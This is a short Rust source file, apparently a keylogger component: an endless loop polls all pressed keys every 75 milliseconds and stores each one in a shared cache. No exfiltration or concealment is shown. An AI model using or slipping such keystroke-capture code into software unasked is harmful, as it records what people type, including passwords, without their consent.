use std::{thread, time};
use device_query::{DeviceQuery, DeviceState};
use crate::SAFE_PUB_VAR;

pub fn log() {
    loop {
        for key_pressed in DeviceState::new().get_keys() {
            loop {
                if let Ok(mut data) = SAFE_PUB_VAR.lock(){
                    data.key_pressed_cache.push(key_pressed.to_string());
                    break;
                }
            }
        }
        thread::sleep(time::Duration::from_millis(75))
    }
}